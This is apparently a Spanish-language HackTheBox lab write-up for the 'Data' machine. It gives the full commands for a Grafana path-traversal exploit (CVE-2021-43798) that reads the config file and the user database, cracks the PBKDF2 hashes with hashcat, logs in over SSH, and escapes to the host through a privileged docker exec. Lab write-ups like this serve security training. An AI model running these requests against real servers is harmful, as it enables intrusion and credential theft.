---
title: Data Machine  
author: epx1lon
date: 2026-01-05 00:34:00 +0800
categories: [WriteUps, HackTHeBox]
tags: [docker,grafana,hashcat]
---

En este post vamos a resolver una máquina que expone un servicio de monitorización muy popular: Grafana. Veremos cómo una falta de validación en las rutas de los plugins nos permite leer la base de datos interna, crackear contraseñas administrativas y, finalmente, escalar privilegios aprovechando permisos mal configurados en Docker.

![ADLab](/assets/img/data.jpg)


## Reconocimiento y Enumeración

Comenzamos con un escaneo de puertos para identificar la superficie de ataque. Utilizamos Nmap para buscar puertos abiertos en todo el rango TCP.

```bash
root@kali:/home/alvaro/htb/data $ nmap -p- --open -sS 10.129.234.47 --min-rate 5000 --disable-arp-ping -n -Pn -vvv                                                          
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:52 -05
Initiating SYN Stealth Scan at 22:52
Scanning 10.129.234.47 [65535 ports]
Discovered open port 22/tcp on 10.129.234.47
Discovered open port 3000/tcp on 10.129.234.47
Completed SYN Stealth Scan at 22:52, 15.03s elapsed (65535 total ports)
Nmap scan report for 10.129.234.47
Host is up, received user-set (0.13s latency).
Scanned at 2025-11-08 22:52:04 -05 for 15s
Not shown: 61099 closed tcp ports (reset), 4434 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 63
3000/tcp open  ppp     syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.12 seconds
           Raw packets sent: 74470 (3.277MB) | Rcvd: 64074 (2.563MB)
```

El escaneo rápido nos revela dos puertos principales:

- 22/tcp (SSH): Para administración remota.
- 3000/tcp (HTTP): Un servicio web en un puerto no estándar.

Profundizamos con un escaneo de versiones y scripts básicos (-sVC) para entender qué corre en el puerto 3000.

```bash
root@kali:/home/alvaro/htb/data $ nmap -p22,3000 -sVC 10.129.234.47 -Pn                                                                                                     
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-08 22:56 -05
Nmap scan report for 10.129.234.47
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 63:47:0a:81:ad:0f:78:07:46:4b:15:52:4a:4d:1e:39 (RSA)
|   256 7d:a9:ac:fa:01:e8:dd:09:90:40:48:ec:dd:f3:08:be (ECDSA)
|_  256 91:33:2d:1a:81:87:1a:84:d3:b9:0b:23:23:3d:19:4b (ED25519)
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
```

Nmap identifica el servicio web como Grafana. Adicionalmente, herramientas como whatweb confirman que se trata de la versión Grafana 8.0.0.

## Análisis de Vulnerabilidades: CVE-2021-43798

Buscamos en searchsploit o bases de datos de CVEs. Encontramos una vulnerabilidad crítica de Directory Traversal y Arbitrary File Read conocida como CVE-2021-43798.

¿En qué consiste el fallo?

Grafana tiene un endpoint diseñado para servir recursos de plugins (/public/plugins/). En versiones vulnerables, no sanea correctamente las rutas solicitadas. Esto permite a un atacante usar secuencias de "salto de directorio" (../) para escapar de la carpeta del plugin y leer cualquier archivo del sistema operativo, siempre que el usuario que corre Grafana tenga permisos de lectura.

```bash
root@kali:/home/alvaro/htb/data $ searchsploit grafana                                                                                                                      
----------------------------------------------------------------------------------------------------------------------------
 Exploit Title                                                                |  Path
----------------------------------------------------------------------------------------------------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                                       | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                   | multiple/webapps/50581.py
Grafana <=6.2.4 - HTML Injection                                              | typescript/webapps/51073.txt
----------------------------------------------------------------------------------------------------------------------------
Shellcodes: No Results
```

## Explotación: Robo de la Base de Datos

En lugar de leer archivos comunes como /etc/passwd, apuntamos directamente al "corazón" de Grafana para buscar credenciales. La base de datos por defecto suele ser SQLite y se ubica en /var/lib/grafana/grafana.db.

Lanzamos la petición con curl preservando la ruta (--path-as-is):

```bash
root@kali:/home/alvaro/htb/data $ curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../etc/grafana/grafana.ini -o grafana.txt       
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 37098  100 37098    0     0  90861      0 --:--:-- --:--:-- --:--:-- 90926
```

```bash
root@kali:/home/alvaro/htb/data $ curl --path-as-is http://10.129.234.47:3000/public/plugins/alertlist/../../../../../../../../var/lib/grafana/grafana.db -o grafana.db     
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  584k  100  584k    0     0   409k      0  0:00:01  0:00:01 --:--:--  409k
```

## Post-Explotación: Cracking de Hashes

Con el archivo grafana.db en local, usamos sqlite3 para inspeccionar su estructura. Nos interesa la tabla user.

```bash
root@kali:/home/alvaro/htb/data $ sqlite3 grafana.db                                                                                                                        
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
alert                       login_attempt             
alert_configuration         migration_log             
alert_instance              org                       
alert_notification          org_user                  
alert_notification_state    playlist                  
alert_rule                  playlist_item             
alert_rule_tag              plugin_setting            
alert_rule_version          preferences               
annotation                  quota                     
annotation_tag              server_lock               
api_key                     session                   
cache_data                  short_url                 
dashboard                   star                      
dashboard_acl               tag                       
dashboard_provisioning      team                      
dashboard_snapshot          team_member               
dashboard_tag               temp_user                 
dashboard_version           test_data                 
data_source                 user                      
library_element             user_auth                 
library_element_connection  user_auth_token           
sqlite> .schema user
CREATE TABLE `user` (
`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL
, `version` INTEGER NOT NULL
, `login` TEXT NOT NULL
, `email` TEXT NOT NULL
, `name` TEXT NULL
, `password` TEXT NULL
, `salt` TEXT NULL
, `rands` TEXT NULL
, `company` TEXT NULL
, `org_id` INTEGER NOT NULL
, `is_admin` INTEGER NOT NULL
, `email_verified` INTEGER NULL
, `theme` TEXT NULL
, `created` DATETIME NOT NULL
, `updated` DATETIME NOT NULL
, `help_flags1` INTEGER NOT NULL DEFAULT 0, `last_seen_at` DATETIME NULL, `is_disabled` INTEGER NOT NULL DEFAULT 0);
CREATE UNIQUE INDEX `UQE_user_login` ON `user` (`login`);
CREATE UNIQUE INDEX `UQE_user_email` ON `user` (`email`);
CREATE INDEX `IDX_user_login_email` ON `user` (`login`,`email`);

sqlite> select email,name,salt,password from user ;
admin@localhost||YObSoLj55S|7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8
boris@data.vl|boris|LCBhdtJWjl|dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8
sqlite> 
```

Obtenemos las credenciales del usuario boris. Grafana utiliza un algoritmo de hashing robusto (PBKDF2-HMAC-SHA256) y un "salt" único por usuario.

Para crackearlo:

- Extraemos el hash y el salt.
- Usamos un script auxiliar (grafana2hashcat.py) para formatearlo de modo que Hashcat lo entienda.
- Ejecutamos Hashcat con el modo 10900

```bash
root@kali:/home/alvaro/htb/data $ cat grafana.hash
dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8,LCBhdtJWjl 
```

```bash
root@kali:/home/alvaro/htb/data $ python3 grafana2hashcat.py grafana.hash 
[+] Grafana2Hashcat 
[+] Reading Grafana hashes from: grafana.hash 
[+] Done! Read 1 hashes in total. 
[+] Converting hashes... 
[+] Converting hashes complete. 
[*] Outfile was not declared, printing output to stdout instead. 

sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg= sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag= 
[+] Now, you can run Hashcat with the following command, for example: 
```

```bash
root@kali:/home/alvaro/htb/data $ hashcat -m 10900 hashcat_hashes.txt --wordlist /usr/share/wordlist/rockyou.txt

hashcat (v6.2.6) starting in autodetect mode 
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode. 
The following mode was auto-detected as the only one matching your input hash: 

10900 | PBKDF2-HMAC-SHA256 | Generic KDF 
...[snip]... 
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1 
...[snip]...
```

En pocos segundos, obtenemos la contraseña en texto plano: beautiful1. Probamos estas credenciales contra el servicio SSH descubierto al inicio:

```bash
root@kali:/home/alvaro/htb/data $ netexec ssh 10.129.234.47 -u boris -p beautiful1 
SSH 10.129.234.47 22 10.129.234.47 [*] SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.7 
SSH 10.129.234.47 22 10.129.234.47 [+] boris:beautiful1 (Pwn3d!) Linux - Shell access!
```

```bash
root@kali:/home/alvaro/htb/data $ ssh -p beautiful1 ssh boris@10.129.234.47 
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64) 
...[snip]... 

boris@data:~$
```

## Escalada de Privilegios: Docker Breakout

Una vez dentro, enumeramos los permisos de nuestro usuario con sudo -l.

```bash
boris@data:~$ sudo -l 
Matching Defaults entries for boris on localhost: 
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin 

User boris may run the following commands on localhost: 
	(root) NOPASSWD: /snap/bin/docker exec *
```
El usuario puede ejecutar comandos dentro de cualquier contenedor Docker corriendo (docker exec) con privilegios de root, sin contraseña.

Aunque docker exec nos da root dentro del contenedor, nuestro objetivo es ser root en el host. Sin embargo, si tenemos control total sobre el comando docker, podemos abusar de ello (o en este caso, simplemente abusar del acceso privilegiado si el contenedor ya tiene montajes o si podemos instanciar uno nuevo, aunque el permiso es solo para exec).

```bash
boris@data:~$ mount 
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime) 
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime) 
udev on /dev type devtmpfs (rw,nosuid,relatime,size=1001016k,nr_inodes=250254,mode=755) 
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=000) 
tmpfs on /run type tmpfs (rw,nosuid,noexec,relatime,size=203120k,mode=755) 
/dev/sda1 on / type ext4 (rw,relatime) 
securityfs on /sys/kernel/security type securityfs (rw,nosuid,nodev,noexec,relatime) 
tmpfs on /dev/shm type tmpfs (rw,nosuid,nodev)
...[snip]... 
```

Ejecutamos una shell en el contenedor activo y tenemos acceso como usuario root.

```bash
boris@data:~$ sudo docker exec -it --privileged --user root e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81 bash bash-5.1#
```

```bash
bash-5.1# mount /dev/sda1 /mnt/ 
bash-5.1# ls /mnt/ 

bin home lib64 opt sbin tmp vmlinuz.old boot initrd.img lost+found proc snap usr dev initrd.img.old media root srv var etc lib mnt run sys vmlinuz
```